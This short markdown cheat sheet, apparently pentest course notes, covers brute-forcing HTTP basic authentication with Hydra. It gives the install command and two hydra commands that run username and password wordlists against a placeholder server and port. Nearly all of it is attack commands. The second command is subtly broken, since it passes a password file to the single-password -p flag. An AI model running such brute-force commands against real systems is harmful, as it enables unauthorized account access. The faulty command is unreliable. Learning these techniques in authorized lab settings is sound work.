# Brute Forcing using Hydra

In order to install it, type ``` sudo apt install hydra -y ``` or [download here](https://github.com/vanhauser-thc/thc-hydra)

For the purpose of attacking HTTP basic auth, type :
 ```
 hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p admin -u -f SERVER_IP -s SERVER_PORT http-get /

 ```
 or
 ```
 hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p /usr/share/SecLists/Passwords/Default-Credentials/default-passwords.txt -u -f SERVER_IP -s SERVER_PORT http-get /

 ```